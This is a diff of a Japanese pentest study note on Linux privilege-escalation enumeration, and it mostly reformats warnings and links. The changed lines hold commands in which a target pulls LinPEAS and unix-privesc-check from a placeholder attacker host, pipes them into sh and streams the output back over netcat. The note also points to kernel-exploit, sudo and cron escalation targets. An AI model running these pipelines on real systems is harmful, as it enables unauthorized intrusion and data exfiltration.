@@ -9,9 +9,10 @@
 ## 目的
 
 - Enumerationを自動化し、すばやく権限昇格ベクターを見つける
-	- 🚨過検知や見逃しの可能性を常に考慮する
-	- 手動でしか発見できないようなそのターゲットシステム独自の構成は自動化ツールには発見できない
 - 権限昇格後においても、すばやく機密情報を探索するために使う
+
+> [!WARNING]
+> 過検知や見逃しの可能性を常に考慮する。手動でしか発見できないようなそのターゲットシステム独自の構成は自動化ツールには発見できない。
 
 ## 実行コマンド
 
@@ -27,7 +28,7 @@ cat output.txt | grep -i warning
 # 💡Targetのメモリで実行し、出力は攻撃者のマシンに保存する
 python -m http.server 8888 # Attacker
 nc -lvnp 9002 | tee unix-privesc-check.out #Attacker
-curl <AttackerIP>:8888/unix-privesc-check | sh -s standard | nc -q 0 <AttackerIP> 9002 #Target
+curl <attacker_IP>:8888/unix-privesc-check | sh -s standard | nc -q 0 <attacker_IP> 9002 #Target
 ```
 - WARNINGの箇所のみ注目で良い
 
@@ -39,7 +40,7 @@ LinPEAS
 # 💡Targetのメモリで実行し、出力は攻撃者のマシンに保存する
 python -m http.server 8888 # Attacker
 nc -lvnp 9002 | tee linpeas.out #Attacker
-curl <AttackerIP>:8888/linpeas.sh | sh | nc -q 0 <AttackerIP> 9002 #Target
+curl <attacker_IP>:8888/linpeas.sh | sh | nc -q 0 <attacker_IP> 9002 #Target
 ```
 
 LinEnum
@@ -60,7 +61,7 @@ wget https://raw.githubusercontent.com/rebootuser/LinEnum/refs/heads/master/LinE
 
 - 偽陽性の可能性を疑うが、つまったら最後に必ずすべて試す
 	- Exposure（エクスプロイトの実行可能性）は当てにならない
-- [💥Linux Privilege Escalation](💥Linux%20Privilege%20Escalation.md#主なカーネルエクスプロイト)
+- [主なカーネルエクスプロイト](💥Linux%20Privilege%20Escalation.md#主なカーネルエクスプロイト)
 
 | エクスプロイト名                                                                | CVE            | エクスプロイトの仕組み                                                                                                                                                               | 使用条件                                                                                                                                  |
 | ----------------------------------------------------------------------- | -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------- |
@@ -97,7 +98,7 @@ id
 ```zsh
 sudo -l
 ```
-- →[💥Linux Privilege Escalation](💥Linux%20Privilege%20Escalation.md#Sudoを利用したPrivEsc)
+- →[Sudoを利用したPrivEsc](💥Linux%20Privilege%20Escalation.md#Sudoを利用したPrivEsc)
 - →`tcpdump`の場合、通信のキャプチャも可能：[🔍Linux Enumeration](#デーモンの列挙コマンド)
 - `NOPASSWD`：sudo xxxとしても、パスワード不要で実行可能
 
@@ -115,7 +116,7 @@ hostname
 ```zsh
 cat /etc/passwd
 ```
-- [🔍Linux Enumeration](#補足：/etc/passwdの出力)
+- [補足：/etc/passwdの出力](#補足：/etc/passwdの出力)
 
 グループ一覧を取得
 ```zsh
@@ -357,10 +358,7 @@ ls -lah /etc/cron*
 
 ![](../../画像ファイル/Pasted%20image%2020250911130420.png)
 
-
-
-$$<cat /etc/cron.daily/dpkg> として中身を閲覧する必要あり$$
-
+$$cat /etc/cron.daily/dpkg として中身を閲覧する必要あり$$
 
 
 現在ログインしているユーザーが設定したcronを列挙
@@ -376,6 +374,9 @@ grep "CRON" /var/log/syslog
 ```
 - 💡`...(root) CMD...` となっていて、定期的に実行されているものが狙い目
     - → `ls -la` の実行で、呼び出されているスクリプトのパーミッションを確認
+
+> [!TIP]
+> `...(root) CMD...` となっていて、定期的に実行されているものが狙い目。`ls -la` の実行で、呼び出されているスクリプトのパーミッションを確認
 
 ## 得られる情報
 
@@ -512,7 +513,6 @@ cd <fstabのmount_point>
 	- swap：メモリ上のデータを一時的にディスクに退避させる場所で、機密情報が暗号化されずに残っている可能性がある（OSはswapに退避させるとき暗号化しないことが多い）
 
 ![](../../画像ファイル/Pasted%20image%2020250827123908.png)
-
 
 ---
 
